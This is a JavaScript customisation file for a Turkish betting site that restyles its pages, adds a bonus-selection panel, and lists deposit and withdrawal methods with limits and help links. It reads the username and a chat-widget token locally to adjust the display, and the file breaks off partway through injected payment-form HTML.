if (window.location.href.indexOf('www') == -1 && window.location.href.indexOf('betadigitain') == -1) {
	window.location.href = 'https://www.'+window.location.host+window.location.pathname;
}
console.log("asdasd");
 var jq = document.createElement('script');
jq.src = "https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js";
document.getElementsByTagName('head')[0].appendChild(jq);

var jq = document.createElement('link');
jq.href = "https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css";
jq.rel = "stylesheet";
document.getElementsByTagName('head')[0].appendChild(jq);


var x = document.createElement('script');
x.src = '';
document.getElementsByTagName("head")[0].appendChild(x);


 if ($('.tl_acc_userid .text').length != 0) {
     username = $('.tl_acc_userid .text').text();
 } else {
     username = $('#menu-right .ui-link:last').text().trim();
 }

document.head.insertAdjacentHTML("beforeend", '<style>.tl_payment_col{min-width:auto!important}</style>');

if (window.zESettings) {

token = window.zESettings.webWidget.authenticate.chat.jwtFn.toString().split("callback('");
token = token[1].split("')");
jwt = token[0];

function parseJwt (token) {
    var base64Url = token.split('.')[1];
    var base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
    var jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(''));
    json = JSON.parse(jsonPayload);
    return json.name.substring(0,1).toUpperCase();
};

GlobalAd = parseJwt(jwt);
    
} else {
    GlobalAd = '';
}


 $(document).on('change','#CurrencyCode', function(){
    if ($('#CurrencyCode').val() != 'TRY') {
        alert('Bulundğunuz bölgeden, '+$('#CurrencyCode').val()+' hesabı açılamamaktadır.');
        return false;
    }
})



var isMobile = false; //initiate as false
// device detection
if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|ipad|iris|kindle|Android|Silk|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(navigator.userAgent)
    || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(navigator.userAgent.substr(0,4))) {
    isMobile = true;
}




if (window.location.href.match(/^.*Account\/Deposit.*$/) ) {
    
    

    if ($('.depositForms').length != 0) {
        $('.depositForms').prepend('<div class="bonus_ekrani" style=" background: #1e2036; padding: 13px; margin-bottom: 13px; color: #fff; border-radius: 3px;"><p style=" margin-bottom: 11px; font-weight: bold;font-size: 16px;">BETKANYON BONUS</p><p style=" margin-bottom: 13px; font-size: 14px; color: #f7f7f7;"> Lütfen yatırım yaptıysanız bonusunuzu almak için seçim yapınız </p><div class="bonus_btn bonus-sec" data-type="2"> Çevrimsiz</div><div class="bonus_btn bonus-sec" data-type="1"> Çevrimli</div><div class="bonus_btn bonus-sec" data-type="3"> Kayıp</div><div class="bonus_btn bonus-sec" data-type="4"> İlk Yatırım</div><div class="alt_tab" style="display: none;"><h4 style="margin-top: 11px;margin-bottom: 12px;display: block;font-size: 15px;"> Bonus Türünü Seçiniz </h4><div class="bonus_btn category-sec" data-type="1"> Spor </div><div class="bonus_btn category-sec" data-type="2"> Casino </div></div><div class="onay_msg" style="display: none;"><p style="line-height: 22px;">Hoşgeldin bonusu almaya hakkınız yoktur, promosyonlar sayfasından kuralları gözden geçirebilirsiniz.a</p></div> <div class="alt_tab2" style="display:none;"><h4 style="margin-top: 11px;margin-bottom: 12px;display: block;font-size: 15px;">Kayıp Bonusu türünü seçiniz.</h4><div class="bonus_btn category-sec" data-type="1">Anlık</div><div class="bonus_btn category-sec" data-type="2">Günlük</div><div class="bonus_btn category-sec" data-type="3">Haftalık</div><div class="bonus_btn category-sec" data-type="4">Pragmatic</div></div> </div><style>.bonus_btn{text-transform: uppercase; border-radius: 2px; outline: none; display: block; height: 36px; line-height: 36px; font-size: 14px; text-decoration: none; padding: 0 15px; /* margin-top: 15px; */ background-color: #f35f39; color: #fff; margin-right: 8px; display: inline-block; margin-bottom: 4px; cursor: pointer;}.bonus_btn_active{background-color: #f9b13c!important; color: #000!important;}.onay_msg{padding: 10px 2px; border-top: 1px solid gray; margin-top: 10px; padding-top: 18px;font-size:16px}.onay-iptal{margin-top: 13px;}.onay_msg2,.onay_msg3{padding: 10px 2px; border-top: 1px solid gray; margin-top: 10px; padding-top: 18px;font-size:16px}.onay-iptal{margin-top: 13px;}</style>');
    }

}
    








$('head').prepend('<style>@media screen and (max-width: 1500px) { .tl_head_promos .main_titles{display: block!important;}.tl_head_promos .icons{display: none!important;} } .tl_promo_news_type { display:none!important} .curacao-egaming img {margin-left:16px!important} </style> ');

$('head').prepend('<style>span.required-field:nth-child(1) { display: none;}</style> ');



if (GlobalAd != ';') {
     titleArr = [
            // ['CMTCüzdan ile Para Yatırma', 'http://bit.ly/CMTCüzdan', '#', '3-10 dk.', 'Ücretsiz', '50 ?', '20.000 ?'],
            // ['Kredi Kartı ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360010378040', '#', '3-10 dk.', 'Ücretsiz', '50 ?', '20.000 ?'],
            ['Hızlı Havale ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023633191', 'https://youtu.be/SQg6CzsYibg', '3-10 dk.', 'Ücretsiz', '50 ?', '20.000 ?'],
            ['Hızlı QR Kod ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023634151', 'https://youtu.be/nXkQfTmB12U', '3-15 dk.', 'Ücretsiz', '50 ?', '12.000 ?'],
            ['CMT Cüzdan ile Para Yatırma', '#', '#', '3-15 dk.', 'Ücretsiz', '50 ?', '12.000 ?'],
            ['Cepbank ile Para Yatırma', '#', '#', '3-15 dk.', 'Ücretsiz', '50 ?', '12.000 ?'],
            ['Papara ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360010650239', 'https://www.youtube.com/watch?v=TjyrvHkg75Y', '1-5 dk.', 'Ücretsiz', '150 ?', '10.000 ?'],
            ['Payfix ile Para Yatırma', '#', '#', '1-5 dk.', 'Ücretsiz', '50 ?', '10.000 ?'],
            ['CoinPayments ile Para Yatırma', '', 'https://youtu.be/eu_EvZVmj28', '1-5 dk.', 'Ücretsiz', '150 ?', '10.000 ?'],
            ['ExpressHavale ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360010650239', 'https://youtu.be/eu_EvZVmj28', '1-5 dk.', 'Ücretsiz', '150 ?', '10.000 ?'],
            ['Hızlı QR Kod ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023634151', 'https://youtu.be/nXkQfTmB12U', '3-15 dk.', 'Ücretsiz', '50 ?', '12.000 ?'],
            ['Banka Havalesi ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023971431', '#', '5-10 dk.', 'Ücretsiz', '300 ?', '50.000 ?'],
            ['Jeton ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023386272', 'https://youtu.be/DP1J0OBWeKM', '5-15 dk.', 'Ücretsiz', '30 ?', '10.000 ?'],
            ['EcoPayz ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023671692', 'https://www.youtube.com/watch?v=894yN5-p4IA&t=24s', '5-15 dk.', 'Ücretsiz', '50 ?', '10.000 ?'],
            ['Bitcoin ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023671392', 'https://youtu.be/COIZIpqCsQk', '5-30 dk.', 'Ücretsiz', '40 ?', '20.000 ?'],
            ['Garanti Cepbank ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023720832', '#', '1-5 dk.', 'Ücretsiz', '50 ?', '1.000 ?'],
            ['Garanti One ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023720832', '#', '1-5 dk.', 'Ücretsiz', '50 ?', '1.000 ?'],
            ['İşbankası Cepmatik ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023724872', '#', '1-5 dk.', 'Ücretsiz', '50 ?', '1.000 ?'],
            ['Yapıkredi Cebe Havale ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023724952', '#', '1-5 dk.', 'Ücretsiz', '50 ?', '1.000 ?'],
            ['Akbank Cep Cüzdan ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023724992', '#', '1-5 dk.', 'Ücretsiz', '50 ?', '1.000 ?'],
            ['Finansbank Cep Bank ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023725092', '#', '1-5 dk.', 'Ücretsiz', '50 ?', '1.000 ?'],
            ['Denizbank Cep Bank ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023971091', '#', '1-5 dk.', 'Ücretsiz', '50 ?', '1.000 ?'],
            ['Vakıfbank Cep Bank ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023725252', '#', '1-5 dk.', 'Ücretsiz', '50 ?', '1.000 ?'],
            ['Ethereum ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023671392', '#', '5-30 dk.', 'Ücretsiz', '40 ?', '20.000 ?'],
            ['Ripple ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023671392', '#', '5-30 dk.', 'Ücretsiz', '40 ?', '20.000 ?'],
    ];
} else {
    titleArr = [
              // ['CMTCüzdan ile Para Yatırma', 'http://bit.ly/CMTCüzdan', '#', '3-10 dk.', 'Ücretsiz', '50 ?', '20.000 ?'],
           // ['Kredi Kartı ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360010378040', '#', '3-10 dk.', 'Ücretsiz', '50 ?', '20.000 ?'],
            ['Hızlı Havale ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023633191', 'https://youtu.be/SQg6CzsYibg', '3-10 dk.', 'Ücretsiz', '50 ?', '20.000 ?'],
            ['Hızlı QR Kod ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023634151', 'https://youtu.be/nXkQfTmB12U', '3-15 dk.', 'Ücretsiz', '50 ?', '12.000 ?'],
            ['CMT Cüzdan ile Para Yatırma', '#', '#', '3-15 dk.', 'Ücretsiz', '50 ?', '12.000 ?'],
            ['Cepbank ile Para Yatırma', '#', '#', '3-15 dk.', 'Ücretsiz', '50 ?', '12.000 ?'],
            ['Papara ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360010650239', 'https://www.youtube.com/watch?v=TjyrvHkg75Y', '1-5 dk.', 'Ücretsiz', '150 ?', '10.000 ?'],
            ['CoinPayments ile Para Yatırma', '', 'https://youtu.be/eu_EvZVmj28', '1-5 dk.', 'Ücretsiz', '150 ?', '10.000 ?'],
            ['ExpressHavale ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360010650239', 'https://youtu.be/eu_EvZVmj28', '1-5 dk.', 'Ücretsiz', '150 ?', '10.000 ?'],
            ['Hızlı QR Kod ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023634151', 'https://youtu.be/nXkQfTmB12U', '3-15 dk.', 'Ücretsiz', '50 ?', '12.000 ?'],
            ['Banka Havalesi ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023971431', '#', '5-10 dk.', 'Ücretsiz', '300 ?', '50.000 ?'],
            ['Jeton ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023386272', 'https://youtu.be/DP1J0OBWeKM', '5-15 dk.', 'Ücretsiz', '30 ?', '10.000 ?'],
            ['EcoPayz ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023671692', 'https://www.youtube.com/watch?v=894yN5-p4IA&t=24s', '5-15 dk.', 'Ücretsiz', '50 ?', '10.000 ?'],
            ['Bitcoin ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023671392', 'https://youtu.be/COIZIpqCsQk', '5-30 dk.', 'Ücretsiz', '40 ?', '20.000 ?'],
            ['Garanti Cepbank ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023720832', '#', '1-5 dk.', 'Ücretsiz', '50 ?', '1.000 ?'],
            ['Garanti One ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023720832', '#', '1-5 dk.', 'Ücretsiz', '50 ?', '1.000 ?'],
            ['İşbankası Cepmatik ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023724872', '#', '1-5 dk.', 'Ücretsiz', '50 ?', '1.000 ?'],
            ['Yapıkredi Cebe Havale ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023724952', '#', '1-5 dk.', 'Ücretsiz', '50 ?', '1.000 ?'],
            ['Akbank Cep Cüzdan ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023724992', '#', '1-5 dk.', 'Ücretsiz', '50 ?', '1.000 ?'],
            ['Finansbank Cep Bank ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023725092', '#', '1-5 dk.', 'Ücretsiz', '50 ?', '1.000 ?'],
            ['Denizbank Cep Bank ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023971091', '#', '1-5 dk.', 'Ücretsiz', '50 ?', '1.000 ?'],
            ['Vakıfbank Cep Bank ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023725252', '#', '1-5 dk.', 'Ücretsiz', '50 ?', '1.000 ?'],
            ['Ethereum ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023671392', '#', '5-30 dk.', 'Ücretsiz', '40 ?', '20.000 ?'],
            ['Ripple ile Para Yatırma', 'http://betkanyon100.com/articles/hc/tr/articles/360023671392', '#', '5-30 dk.', 'Ücretsiz', '40 ?', '20.000 ?'],
    ];
}
  

      

/*
$('.tl_head_promos').append('<a href="#" class="main_titles" target="_blank">?? Bonus Kazan</a>');
*/

$(function(){

setTimeout(function(){
    if ($('#mobileSlider').length > 0) {
        $('div[data-ceg-image-type=basic-small] img').css('width','95px').css('height','');
        $('div[data-ceg-image-type=basic-small] div').css('overflow','');
    }
},100);
    
if ($('#mobileSlider').length > 0 && $('.platformMobReg').text() != 'Register' || $('#main_slider').length > 0 && $('.registerDialog').text() != 'Register') {
  
    $('.tl_footer_BG, #footer').before('<style>.owl-item img{background: #1e2036; border-radius: 4px;}</style><div class="banner_BG altslider" style="height: auto;"> <div class="owl-carousel owl-theme"> <a href="http://betkanyon100.com/articles/hc/tr/articles/360010378040" target="_blank"> <div class="item"> <img src="https://betkanyon100.com/development/111.png?v=1" alt=""> </div></a> <a href="http://betkanyon100.com/articles/hc/tr/articles/360023634151" target="_blank"> <div class="item"> <img src="https://betkanyon100.com/development/112.png?v=1" alt=""> </div></a> <a href="http://betkanyon100.com/articles/hc/tr/sections/360001283751-Finans-İşlemleri" target="_blank"> <div class="item"> <img src="https://betkanyon100.com/development/113.png?v=1" alt=""> </div></a> <a href="http://betkanyon100.com/articles/hc/tr/articles/360023386272" target="_blank"> <div class="item"> <img src="https://betkanyon100.com/development/114.png?v=1" alt=""> </div></a> <a href="http://betkanyon100.com/articles/hc/tr/articles/360023633191" target="_blank"> <div class="item"> <img src="https://betkanyon100.com/development/115.png?v=1" alt=""> </div></a> <a href="http://betkanyon100.com/articles/hc/tr/articles/360023671692" target="_blank"> <div class="item"> <img src="https://betkanyon100.com/development/116.png?v=1" alt=""> </div></a> <a href="http://betkanyon100.com/articles/hc/tr/articles/360023671392" target="_blank"> <div class="item"> <img src="https://betkanyon100.com/development/117.png?v=1" alt=""> </div></a> <a href="http://betkanyon100.com/articles/hc/tr/articles/360010650239" target="_blank"> <div class="item"> <img src="https://betkanyon100.com/development/118.png?v=1" alt=""> </div></a> </div></div>');    
   

    if ($('#footer')) {
        $('.banner_BG').css('padding','0px 10px');
    }

  
    setTimeout(function(){
        if ($('.owl-carousel')) {
            $('.owl-carousel').owlCarousel({
                loop:true,
                margin:10,
                nav:false,
                autoplay:true,
                autoplayTimeout:3000,
                autoplayHoverPause:true,
                responsive:{
                    0:{
                        items:1
                    },
                    600:{
                        items:3
                    },
                    1000:{
                        items:6
                    }
                }
            })
        }
    },1400)    
}
});






    if ($('#footer .notificationSettings_item')) {
        
    } else {
        
    }
                   
digertik = 0;
/* Masaüstü */
$(document).ajaxComplete(function (event, request, set) {
    
    
    $('div[data-type=denizbank]').hide();
    $('div[data-type=finansbank]').hide();
    $('div[data-type=akbank]').hide();
    $('div[data-type=yapikredi]').hide();
    $('div[data-type=isbankasicepmatik]').hide();
    $('div[data-type=garantionecepbank]').hide();
    $('div[data-type=garantibank]').hide();
    $('div[data-type=vakifbank]').hide();
    
    
    if ($('.tl_acc_userid .text').length == 0) {
       username = $('a[href=#right-panel]').eq(2).text(); 
    } else {
       username = $('.tl_acc_userid .text').text();
    }
if (GlobalAd != ';') {
   $('#deposit div[data-type=papara]').hide();
   $('.depositForms div[data-type=papara]').hide();
} else {
   $('div[data-type=expresshavale]').hide();
}
       $('div[data-type=expresshavale]').hide();
    if (set.url.match(/^.*Account.*$/) || set.url.match(/^.*Account\/Papara.*$/)) {
   
       $('.paymentlist5 .tl_payment_block').each(function(index) {    
                thisType = $(this).attr('data-type');
                $(this).find('.tl_payment_head').attr('data-payment-desc',titleArr[index][0]);
                $(this).find('.tl_payment_head ').css('min-height','95px');
                $(this).find('.tl_payment_body ').css('padding-top','0px');
                $(this).find('.tl_payment_desc').text(titleArr[index][0]);
       });
   }
    
    
     $(".docImg").on("click",function() {
              window.open($(this).attr('href'), '_blank');
         });
    
    $(".docVid").on("click",function() {
        if ($(this).attr('href') != '#' && digertik == 0) {
            digertik = 1;
            $(this).parent().parent().removeClass('active');
            $('.sahteLink').html($(this).clone());
            $('.sahteLink a').click();
            setTimeout(function(){
                $(this).parent().parent().removeClass('active');
                digertik = 0;
            },1500);
            return false;
        }
     }); 

    $('.spacer .btn_sec').each(function(){
        if ($(this).text() == 'How To Deposit') {
            $(this).text('NASIL YATIRIM YAPILIR ?');
        }
    });
    
    /*
    if (set.url.match(/^.*Account\/_ripple.*$/)) {
        $('div[data-type=ripple] .tl_payment_body:first').prepend('<a class="docTxt"   href="https://coingate.com/pay/betkanyon"><img href="https://coingate.com/pay/betkanyon" class="docImg" style="margin-bottom: 20px;" src="https://betkanyon100.com/img/btcb.png"></a>');
    }
    */
    
    
    
    if (set.url.match(/^.*Account\/_paparaWithdrawal.*$/)) {
       $('#withdraw div[data-type="papara"] .tl_payment_padd:last').after('<p style=" display: block; width: 100%; margin-bottom: 19px; margin-left: 7px; color: #fff; font-size: 14px;">Çekim işlemlerinizi 50 TL\'nin katları olarak vermeniz gerekmektedir.</p>');
    }
    
    if (set.url.match(/^.*Account\/_transfertoaccountWithdrawal.*$/)) {
       $('#withdraw div[data-type="transfertoaccount"] .tl_payment_padd:last').after('<p style=" display: block; width: 100%; margin-bottom: 19px; margin-left: 7px; color: #fff; font-size: 14px;">Çekim işlemlerinizi 50 TL\'nin katları olarak vermeniz gerekmektedir.</p>');
    }
    
    if (set.url.match(/^.*Account\/_ecopayzWithdrawal.*$/)) {
       $('#withdraw div[data-type="ecopayz"] form').after('<br><p style=" display: block; width: 100%; margin-bottom: 19px; margin-left: 7px; color: #fff; font-size: 14px;">Çekim işlemlerinizi 50 TL\'nin katları olarak vermeniz gerekmektedir.</p>');
    }
    
    if (set.url.match(/^.*Account\/_bitcoinWithdrawal.*$/)) {
       $('#withdraw div[data-type="bitcoin"] .tl_payment_padd:last').after('<p style=" display: block; width: 100%; margin-bottom: 19px; margin-left: 7px; color: #fff; font-size: 14px;">Çekim işlemlerinizi 50 TL\'nin katları olarak vermeniz gerekmektedir.</p>');
    }
 
    /*
    if (set.url.match(/^.*Account\/_bitcoin.*$/)) {
        $('div[data-type=bitcoin] .tl_payment_body:first').prepend('<a  href="https://coingate.com/pay/betkanyon"><img href="https://coingate.com/pay/betkanyon" class="docImg" style="margin-bottom: 20px;"  src="https://betkanyon100.com/img/btcb.png"></a>');
        
            $(".docImg").on("click",function() {
              window.open($(this).attr('href'), '_blank');
         });
        
    }
    
    if (set.url.match(/^.*Account\/_ethereum.*$/)) {
        $('div[data-type=ethereum] .tl_payment_body:first').prepend('<a  href="https://coingate.com/pay/betkanyon"><img href="https://coingate.com/pay/betkanyon" class="docImg" style="margin-bottom: 20px;" src="https://betkanyon100.com/img/btcb.png"></a>');
        
            $(".docImg").on("click",function() {
              window.open($(this).attr('href'), '_blank');
         });
        
    }
    
    */
    
    /*
    if (set.url.match(/^.*Account\/_qr.*$/)) {
        $('div[data-type=qr] .tl_payment_body:first').prepend('<a  href="https://fastqr.favoripay.com/Home/6161"><img href="https://fastqr.favoripay.com/Home/6161" class="docImg" style="margin-bottom: 20px;"  src="https://betkanyon100.com/img/qrb.png"></a>');
        
         $(".docImg").on("click",function() {
              window.open($(this).attr('href'), '_blank');
         });
        
    }
    
    if (set.url.match(/Account\/_qr.*$/)) {
        if ($('div[data-type=qr] .docImg').length == 0) {
            $('div[data-type=qr]').find('.collapse_content').prepend('<a target="_blank" href="https://fastqr.favoripay.com/Home/6161"><img  class="docImg" style="width:100%;max-width:600px;"  src="https://betkanyon100.com/img/qrb.png"></a>');
        }
    }
    
    */
    /*
    if (set.url.match(/Account\/_ethereum.*$/)) {
        if ($('div[data-type=ethereum] .docImg').length == 0) {
             $('div[data-type=ethereum]').find('.collapse_content').prepend('<a target="_blank" href="https://coingate.com/pay/betkanyon"><img class="docImg" style="width:100%;max-width:600px;"  src="https://betkanyon100.com/img/btcb.png"></a>');
        }
    }
    
    if (set.url.match(/Account\/_ripple.*$/)) {
        if ($('div[data-type=ripple] .docImg').length == 0) {
            $('div[data-type=ripple]').find('.collapse_content').prepend('<a target="_blank" href="https://coingate.com/pay/betkanyon"><img class="docImg" style="width:100%;max-width:600px;"  src="https://betkanyon100.com/img/btcb.png"></a>');
        }
    }
    
    if (set.url.match(/Account\/_bitcoin.*$/)) {
        if ($('div[data-type=bitcoin] .docImg').length == 0) {
         $('div[data-type=bitcoin]').find('.collapse_content').prepend('<a target="_blank" href="https://coingate.com/pay/betkanyon"><img  class="docImg" style="width:100%;max-width:600px;"  src="https://betkanyon100.com/img/btcb.png"></a>');
        }
    }
    */
    
    
    
             
	if (set.url.match(/^.*Account\/Deposit.*$/) || set.url.match(/Account\/(.*)/g)) {
        setTimeout(function(){
            
    
   
             
            $('div[data-type=qr]').hide();
            
            if ($('.acDiv').length == 0 && $('#deposit').length != 0) {
                

                
                
                    $('div[data-type=qr]').hide();
                
                    if (GlobalAd != ';') {
                        $('.tl_my_acc_title').after('<style>.tl_payment_body form{padding: 0 !important;}.tutarlar{background: #e9e9f3; display: inline-block; border-radius: 4px; margin-left: 7px; padding: 9px; font-size: 15px; margin-top: 6px;}.hizli-post .field-validation-error{color: #fff !important;}</style><div class="tl_payment_block hizli-post"> <div class="tl_payment_head toggleblock flex acDiv" data-payment-desc="Papara ile Yatirma"> <div class="tl_payment_col tl_icon_col"><span class="tl_payment_icon" style="background-image:url(/Img/common/hizli.png);background-position: 0;"></span></div><div class="tl_payment_col tl_desc_col"> <p class="tl_payment_desc deposit_payment">Hizli Havale ile Yatirma</p></div><div class="tl_payment_col tl_info_col flex"> <a class="tl_info_link tl_link" title="Islem Süresi"> <i class="tl_clock_icon tf_clock_icon icon_color"></i><span class="tx deposit_payment">3-15min</span> </a> <a class="tl_info_link tl_link" title="Islem Ücreti"> <i class="tl_percent_icon tf_percent_icon icon_color"></i><span class="tx deposit_payment">Ücretsiz</span> </a> </div><div class="tl_payment_col tl_min_max_col flex"> <p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Min.</span><span class="tl_min_max_value">50 TRY</span></p><p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Max.</span><span class="tl_min_max_value">20 000 TRY</span></p></div></div><div class="tl_payment_body transition" style="margin-left: 9px;padding-top: 0px;min-height: auto;margin-top: -27px;"> <p style=" color: #fff; padding: 7px; margin-bottom: 8px; line-height: 24px; padding-top: 18px;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır. <form action="/tr/Account/_expresshavale" class="methods flex" id="expresshavale" method="post" novalidate="novalidate"> <div class="tl_payment_col tl_payment_padd" style=" display: none;"> <span class="reg_err_mess field-validation-error" data-valmsg-for="ExpressHavale.PaymentType" data-valmsg-replace="true"> </span> <input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType" name="ExpressHavale.paymentType" type="hidden" value="2"> </div><div class="tl_payment_col tl_payment_padd"> <a href="#" class="tl_deposit_button btnSec transBg expresshavale_btn3">ÖDEME YAP</a> </div><div class="tl_methods_loader_cont"> <div class="flex"> <div class="tl_load_msg">İşlemleriniz bittiği zaman yatırımınız otomatik olarak yansıtılacaktır. ...</div></div></div><div id="gateWayScript"></div></form> <div class="message" style=" padding: 6px; margin-bottom: 10px; padding-bottom: 20px;"></div></div></div><div class="tl_payment_block hizli-post"> <div class="tl_payment_head toggleblock flex acDiv" data-payment-desc="Hızlı QR Para ile Yatirma"> <div class="tl_payment_col tl_icon_col"><span class="tl_payment_icon" style="background-image:url(/Img/Banners/instantqrlogo.jpg);background-position: 0;"></span></div><div class="tl_payment_col tl_desc_col"> <p class="tl_payment_desc deposit_payment">Hızlı QR Para ile Yatirma</p></div><div class="tl_payment_col tl_info_col flex"> <a class="tl_info_link tl_link" title="Islem Süresi"> <i class="tl_clock_icon tf_clock_icon icon_color"></i><span class="tx deposit_payment">3-15min</span> </a> <a class="tl_info_link tl_link" title="Islem Ücreti"> <i class="tl_percent_icon tf_percent_icon icon_color"></i><span class="tx deposit_payment">Ücretsiz</span> </a> </div><div class="tl_payment_col tl_min_max_col flex"> <p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Min.</span><span class="tl_min_max_value">50 TRY</span></p><p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Max.</span><span class="tl_min_max_value">4 000 TRY</span></p></div></div><div class="tl_payment_body transition" style="margin-left: 9px;padding-top: 0px;min-height: auto;margin-top: -27px;"> <p style=" color: #fff; padding: 7px; margin-bottom: 8px; line-height: 24px; padding-top: 18px;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır. <br>Aktif Bankalar : Garanti, Türkiye İş Bankası, Ziraat Bank, Yapıkredi, <!-- Akbank, Denizbank, TEB, ING --></p><form action="/tr/Account/_expresshavale" class="methods flex" id="expresshavale" method="post" novalidate="novalidate"> <div class="tl_payment_col tl_payment_padd" style=" display: none;"> <span class="reg_err_mess field-validation-error" data-valmsg-for="ExpressHavale.PaymentType" data-valmsg-replace="true"> </span> <input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType" name="ExpressHavale.paymentType" type="hidden" value="2"> </div><div class="tl_payment_col tl_payment_padd"> <a 